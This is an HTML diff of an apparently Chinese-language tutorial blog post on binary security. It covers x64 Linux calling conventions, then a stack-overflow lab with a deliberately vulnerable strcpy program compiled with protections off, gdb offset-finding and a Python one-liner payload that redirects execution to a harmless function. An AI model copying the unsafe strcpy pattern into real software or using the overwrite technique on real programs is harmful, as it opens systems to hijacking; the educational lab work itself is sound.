@@ -1,0 +1,883 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="https://raw.githubusercontent.com/Luyoung0001/picBed/main/low.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Luyoung">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="基于 x64 的 Linux 函数调用过程caller 在 call 以及 call 之前、callee 在 ret 以及 ret之前都会做一些事情，以有序得执行程序。 比如，对于 main 函数调用 add_ints： 123456789NOINLINE long add_ints(long x, long y, long z) &#123;    &#x2F;&#x2F; 触发 RDI, RSI, RDX">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈二进制安全(一)">
+<meta property="og:url" content="http://blog.luliang.online/2025/09/02/%E6%B5%85%E8%B0%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="Luyoung">
+<meta property="og:description" content="基于 x64 的 Linux 函数调用过程caller 在 call 以及 call 之前、callee 在 ret 以及 ret之前都会做一些事情，以有序得执行程序。 比如，对于 main 函数调用 add_ints： 123456789NOINLINE long add_ints(long x, long y, long z) &#123;    &#x2F;&#x2F; 触发 RDI, RSI, RDX">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Luyoung0001/picBed/main/pwn_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Luyoung0001/picBed/main/pwn_2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Luyoung0001/picBed/main/pwn_3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Luyoung0001/picBed/main/pwn_4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Luyoung0001/picBed/main/pwn_5.png">
+<meta property="article:published_time" content="2025-09-02T05:03:13.000Z">
+<meta property="article:modified_time" content="2026-01-24T09:00:40.455Z">
+<meta property="article:author" content="Luyoung">
+<meta property="article:tag" content="二进制安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Luyoung0001/picBed/main/pwn_1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>浅谈二进制安全(一) - Luyoung</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.luliang.online","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 65vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Luyoung</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Luyoung0001/picBed/main/1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="浅谈二进制安全(一)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-02 13:03" pubdate>
+          2025年9月2日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">浅谈二进制安全(一)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="基于-x64-的-Linux-函数调用过程"><a href="#基于-x64-的-Linux-函数调用过程" class="headerlink" title="基于 x64 的 Linux 函数调用过程"></a>基于 x64 的 Linux 函数调用过程</h2><p>caller 在 call 以及 call 之前、callee 在 ret 以及 ret之前都会做一些事情，以有序得执行程序。</p>
+<p>比如，对于 main 函数调用 add_ints：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C">NOINLINE <span class="hljs-type">long</span> <span class="hljs-title function_">add_ints</span><span class="hljs-params">(<span class="hljs-type">long</span> x, <span class="hljs-type">long</span> y, <span class="hljs-type">long</span> z)</span> &#123;<br>    <span class="hljs-comment">// 触发 RDI, RSI, RDX</span><br>    <span class="hljs-keyword">return</span> x + y + z;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-type">long</span> r1 = add_ints(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在编译参数为 <code>gcc -O0 -fno-omit-frame-pointer -g -no-pie -masm=intel abi_demo.c -o abi_demo</code> 的时候，部分反汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs asm">&lt;main&gt;:<br>  ...<br>  4012cc:	ba 1e 00 00 00       	mov    edx,0x1e<br>  4012d1:	be 14 00 00 00       	mov    esi,0x14<br>  4012d6:	bf 0a 00 00 00       	mov    edi,0xa<br>  4012db:	e8 76 fe ff ff       	call   401156 &lt;add_ints&gt;<br>  4012e0:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax<br>  ...<br><br><br>&lt;add_ints&gt;:<br>  401156:	f3 0f 1e fa          	endbr64<br>  40115a:	55                   	push   rbp<br>  40115b:	48 89 e5             	mov    rbp,rsp<br>  40115e:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi<br>  401162:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi<br>  401166:	48 89 55 e8          	mov    QWORD PTR [rbp-0x18],rdx<br>  40116a:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]<br>  40116e:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]<br>  401172:	48 01 c2             	add    rdx,rax<br>  401175:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]<br>  401179:	48 01 d0             	add    rax,rdx<br>  40117c:	5d                   	pop    rbp<br>  40117d:	c3                   	ret<br></code></pre></td></tr></table></figure>
+
+<p>首先 main 函数将参数放到 edx、esi、edi 中，然后 执行 call。</p>
+<p>这个 call 指令有几个含义：</p>
+<ul>
+<li>首先会将 call 指令后面一条指令的地址，也就是 ret_addr 存储到 rsp -&#x3D; 8 中，也就是 push 了一次 ret_addr；</li>
+<li>接着跳转到 add_ints。</li>
+</ul>
+<p>到达 add_ints 后（暂时忽略 endbr64），接着将 caller 也就是 main 的 ebp push。然后开辟新的栈帧，此时 rsp 指向了保存 caller 的 ebp，新的 ebp 保存的是 rsp。从这里就可以看到，新的栈帧是从保存 caller 的 ebp 开始的。</p>
+<p>接着就开始执行函数功能代码了。</p>
+<p>执行完了后，由于 rsp 指向的是 caller 的 rbp，因此这里直接 pop rbp 来恢复 rbp（下面会介绍稍微复杂的情况），此时 rsp -&#x3D; 8，指向的是 ret_addr。之后就是 ret，这个 ret 的时候 ，会把 rsp 保存的 ret_addr 直接赋给 rip，也就是相当于 pop rip。</p>
+<p>在 x86-64 上，近返回指令 ret 的语义本质上就是“从栈顶取返回地址到 RIP，同时弹栈”，可以理解为“pop + 跳转”。这样调用函数完后，main 就会返回继续执行。</p>
+<p>因此在 callee 的栈从高地址到低地址（示意）是：</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less">           ↑ 高地址方向<br><span class="hljs-selector-attr">[rbp+16]</span> : (第<span class="hljs-number">7</span>个及之后的栈上传参/对齐区域…)<br><span class="hljs-selector-attr">[rbp+8 ]</span> : 保存的返回地址 <span class="hljs-selector-tag">saved_rip</span><br><span class="hljs-selector-attr">[rbp   ]</span> : 保存的<span class="hljs-selector-tag">caller</span> <span class="hljs-selector-tag">rbp</span>，也是 <span class="hljs-selector-tag">callee</span> 的 <span class="hljs-selector-tag">rbp</span><br><span class="hljs-selector-attr">[rbp-8 ]</span> : 栈 <span class="hljs-selector-tag">canary</span>（若启用）<br><span class="hljs-selector-attr">[rbp-..]</span> : 本函数局部变量区（如 <span class="hljs-selector-tag">buf</span><span class="hljs-selector-attr">[64]</span>）<br>           ↓ 低地址方向<br><br></code></pre></td></tr></table></figure>
+
+<p>以上就是函数调用和返回的细节。</p>
+<h2 id="ROP-攻击"><a href="#ROP-攻击" class="headerlink" title="ROP 攻击"></a>ROP 攻击</h2><p>ROP 攻击是利用程序将 saved_rip 保存在栈上，用户可以修改从而改变返回地址的攻击方法，这样可以劫持 caller 的返回点。</p>
+<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evil_function</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Oops! You&#x27;ve been hacked! The program control flow has been hijacked!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 易受攻击的函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">(<span class="hljs-type">char</span> *input)</span> &#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">16</span>]; <span class="hljs-comment">// 一个小缓冲区，容易溢出</span><br><br>    <span class="hljs-comment">// 存在栈溢出漏洞：没有边界检查</span><br>    <span class="hljs-built_in">strcpy</span>(buffer, input);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Buffer content: %s\n&quot;</span>, buffer);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: %s &lt;input_string&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 调用易受攻击的函数</span><br>    vulnerable_function(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program finished normally.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>为了让这个示例成功，我们需要关闭所有现代安全保护。在 x64 Linux 上，需要使用以下命令来编译代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -fno-stack-protector: 关闭栈金丝雀保护</span><br><span class="hljs-comment"># -fno-pie: 关闭位置无关可执行文件，方便预测地址</span><br><span class="hljs-comment"># -no-cet-shstk: 关闭CET影子栈保护</span><br><span class="hljs-comment"># -g: 包含调试信息，方便查看地址</span><br>gcc -o vulnerable_program -fno-stack-protector -fno-pie -no-cet-shstk -g vulnerable_program.c<br></code></pre></td></tr></table></figure>
+
+<h3 id="寻找目标地址和偏移"><a href="#寻找目标地址和偏移" class="headerlink" title="寻找目标地址和偏移"></a>寻找目标地址和偏移</h3><p>为了成功利用栈溢出，我们需要知道三个关键信息：</p>
+<ul>
+<li>evil_function 的地址：这是我们想要劫持程序跳转到的目标地址；</li>
+<li>vulnerable_function 中 buffer 变量到 saved_rip 的偏移量：我们需要填充多少字节来到达并覆盖返回地址。</li>
+</ul>
+<h4 id="1-找到-evil-function-的地址"><a href="#1-找到-evil-function-的地址" class="headerlink" title="1. 找到 evil_function 的地址"></a>1. 找到 evil_function 的地址</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) b vulnerable_function<br>Breakpoint 1 at 0x4011a0: file vulnerable_program.c, line 13.<br>(gdb) p evil_function<br><span class="hljs-variable">$1</span> = &#123;void ()&#125; 0x401176 &lt;evil_function&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-找到-buffer-到-saved-rip-的偏移量"><a href="#2-找到-buffer-到-saved-rip-的偏移量" class="headerlink" title="2. 找到 buffer 到 saved_rip 的偏移量"></a>2. 找到 buffer 到 saved_rip 的偏移量</h4><p>我们可以在 vulnerable_function 中设置一个断点，然后观察 buffer 和栈上返回地址的内存位置。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) p &amp;buffer<br><span class="hljs-variable">$1</span> = (char (*)[16]) 0x7fffffffdc80<br>(gdb) x/gx <span class="hljs-variable">$rbp</span>+8<br>0x7fffffffdc98:	0x0000000000401222<br></code></pre></td></tr></table></figure>
+<p>这样看得更更清楚：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) x/64gx <span class="hljs-variable">$rsp</span><br>0x7fffffffdc70:	0x00007ffff7fc1000	0x00007fffffffe17c<br>0x7fffffffdc80:	0x0000000000000002	0x00000000bfebfbff<br>0x7fffffffdc90:	0x00007fffffffdcb0	0x0000000000401222<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">00000000004011d1 &lt;main&gt;:<br>  ...<br>  401217:	48 8b 00             	mov    rax,QWORD PTR [rax]<br>  40121a:	48 89 c7             	mov    rdi,rax<br>  40121d:	e8 6e ff ff ff       	call   401190 &lt;vulnerable_function&gt;<br>  401222:	48 8d 05 53 0e 00 00 	lea    rax,[rip+0xe53]        # 40207c &lt;_IO_stdin_used+0x7c&gt;<br>  ...<br></code></pre></td></tr></table></figure>
+
+<p>可以看到此时 saved_rip 是 0x40122，这正是 <code>call   401190 &lt;vulnerable_function&gt;</code> 语句的下一条指令地址，main 会在 vulnerable_function 函数执行完后返回到这里。</p>
+<p>通过计算，我们得到偏移量：0x7fffffffdc98 - 0x7fffffffdc80 &#x3D; 0x18 &#x3D; 24字节。<br>这表示我们需要用24个字节来填充缓冲区，然后才能开始覆盖 saved_rip。</p>
+<h4 id="3-构造攻击载荷"><a href="#3-构造攻击载荷" class="headerlink" title="3.构造攻击载荷"></a>3.构造攻击载荷</h4><p>现在有了所有必要的信息：</p>
+<ul>
+<li><p>填充字节数：24</p>
+</li>
+<li><p>目标地址：0x401176</p>
+</li>
+</ul>
+<p>攻击载荷将由两部分组成：</p>
+<ul>
+<li>24个填充字节，用于溢出 buffer 和栈帧的其它部分。</li>
+<li>8个字节，用于覆盖 saved_rip，这8个字节是 evil_function 的地址 0x401176 的小端字节序表示。</li>
+</ul>
+<p>在shell中，我们可以使用Python来方便地构造这个载荷。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import sys; sys.stdout.buffer.write(b&quot;A&quot;*24 + b&quot;\x76\x11\x40\x00\x00\x00\x00\x00&quot;)&#x27;</span> &gt; payload<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>b”A”*24：24个ASCII A 作为填充字节。</p>
+</li>
+<li><p>b”\x76\x11\x40\x00\x00\x00\x00\x00”：0x401176 的小端字节序表示。</p>
+</li>
+</ul>
+<h3 id="执行攻击"><a href="#执行攻击" class="headerlink" title="执行攻击"></a>执行攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vulnerable_program $(<span class="hljs-built_in">cat</span> payload)<br>Buffer content: AAAAAAAAAAAAAAAAAAAAAAAAv@<br>Oops! You<span class="hljs-string">&#x27;ve been hacked! The program control flow has been hijacked!</span><br><span class="hljs-string">[1]    35505 segmentation fault (core dumped)  ./vulnerable_program $(cat payload)</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>如果一切成功，程序会首先打印出被溢出的缓冲区内容，然后，当 vulnerable_function 试图返回时，它会从栈上读取到我们注入的 0x401147 地址，并跳转到 evil_function。</p>
+<h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><p>可以看到，尽管攻击成功地劫持了程序流并执行了 evil_function，但随后的段错误表明程序在 evil_function 返回时再次崩溃了。</p>
+<p>它会尝试从栈上弹出一个返回地址。然而，栈上并没有为 evil_function 放置一个有效的返回地址。evil_function 从栈上弹出一个无效或随机的地址（通常是攻击载荷中的剩余数据），并尝试跳转到该地址。这个无效的跳转导致程序访问了一个未分配或受保护的内存区域，从而触发了段错误。</p>
+<h3 id="解决方案：构造完整的-ROP-链"><a href="#解决方案：构造完整的-ROP-链" class="headerlink" title="解决方案：构造完整的 ROP 链"></a>解决方案：构造完整的 ROP 链</h3><p>需要构造一个更完整的 ROP 链，以确保 evil_function 返回后，程序能继续执行有效指令。</p>
+<p>最简单的解决方法是，让 evil_function 返回到 main 函数中 vulnerable_function 调用之后的地址。</p>
+<h3 id="攻击载荷的新结构"><a href="#攻击载荷的新结构" class="headerlink" title="攻击载荷的新结构"></a>攻击载荷的新结构</h3><ul>
+<li>24字节填充：覆盖 vulnerable_function 的 buffer；</li>
+<li>8字节 evil_function 地址：劫持程序流到 evil_function。</li>
+</ul>
+<p>此时函数从 vulnerable_function 返回后，本来应该返回到 main 中，但是此时却返回到了 evil_function，我们需要明白这中间的<strong>所有细节</strong>。</p>
+<p>假设此时在 vulnerable_function 中，栈如下表示</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[rbp+8 ]</span> : <span class="hljs-selector-tag">main</span> 的返回地址 <span class="hljs-selector-tag">saved_rip</span>，被篡改<br><span class="hljs-selector-attr">[rbp   ]</span> : 保存的 <span class="hljs-selector-tag">main</span> <span class="hljs-selector-tag">rbp</span>，也是 <span class="hljs-selector-tag">vulnerable_function</span> 的 <span class="hljs-selector-tag">rbp</span>，但已被污染<br></code></pre></td></tr></table></figure>
+<p>使用攻击载荷之后，在执行 vulnerable_function 的返回代码之前：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">4011cf:	c9                   	leave<br>4011d0:	c3                   	ret<br></code></pre></td></tr></table></figure>
+
+<p>关键内存（saved_rip）数据如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) x/gx <span class="hljs-variable">$rbp</span>+8<br>0x7fffffffdc68: 0x0000000000401222<br>(gdb) ni<br>(gdb) ni<br>(gdb) x/gx <span class="hljs-variable">$rbp</span>+8<br>0x7fffffffdc68: 0x0000000000401176<br>(gdb)<br><br></code></pre></td></tr></table></figure>
+
+<p>前面知道，leave、ret 两个指令的 作用是：</p>
+<ul>
+<li>mov rsp, rbp ; pop rbp</li>
+<li>从 [rsp] 弹出 8 字节到 RIP 并跳转</li>
+</ul>
+<p>那么 vulnerable_function 执行完 leave 之后，rbp 被篡改，rsp 恢复到 main，saved_rip 篡改到 evil_function。</p>
+<p>换句话说，到目前为止这执行流看起来正确，其实栈的控制、寄存器的控制都是错误的。接下来仔细分析程序执行的细节：</p>
+<h3 id="程序过程"><a href="#程序过程" class="headerlink" title="程序过程"></a>程序过程</h3><p>main 的 rsp、rbp（带有攻击载荷）：</p>
+<p><img src="https://raw.githubusercontent.com/Luyoung0001/picBed/main/pwn_1.png"></p>
+<p>rsp 恢复到了 main，但是 rbp 已经被篡改：</p>
+<p><img src="https://raw.githubusercontent.com/Luyoung0001/picBed/main/pwn_2.png"></p>
+<p>因为 rbp 是错误的，因此 evil_function 执行 ret 的时候，肯定有问题。因此必须在构造载荷的时候，得让 rbp 恢复到 main，这样 evil_function ret 的时候，和 main 执行 ret 等价。</p>
+<h3 id="新的载荷"><a href="#新的载荷" class="headerlink" title="新的载荷"></a>新的载荷</h3><ul>
+<li><p>24字节填充：覆盖 vulnerable_function 的 buffer。</p>
+</li>
+<li><p>8字节 evil_function 地址：劫持程序流到 evil_function。</p>
+</li>
+<li><p>8字节 main 函数中的返回地址：确保 evil_function 返回时，程序能回到 main 函数中正常结束。</p>
+</li>
+</ul>
+<p>我希望，能构建这样的载荷：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import sys; sys.stdout.buffer.write(b&quot;\xd1\x11\x40\x00\x00\x00\x00\x00&quot;*3 + b&quot;\x76\x11\x40\x00\x00\x00\x00\x00&quot;)&#x27;</span> &gt; payload<br></code></pre></td></tr></table></figure>
+
+<p>它能够将正确的值，也就是原来的 main 的 rbp 正确恢复。但是事实上不成功：</p>
+<p><img src="https://raw.githubusercontent.com/Luyoung0001/picBed/main/pwn_3.png"></p>
+<p>一共 32 B 的载荷，只有前 8 个字节被覆盖到，后面就没动。为什么？原来这个和 strcpy() 特性有关：strcpy&#x2F;printf(“%s”) 这类按 C 字符串的函数，会一直拷贝直到遇到第一个 \x00。</p>
+<p>也就是说，实际上载荷只拷贝了 3 个字节。</p>
+<p>这样，我们的载荷构建就有很大的局域性，它严重依赖于载荷中没有&#x2F;00 这样的字符。事实上这几乎是不可能的，因此现在阶段，只能劫持到 evil_function，想让它顺利执行完并返回到 _start 条件太严格。</p>
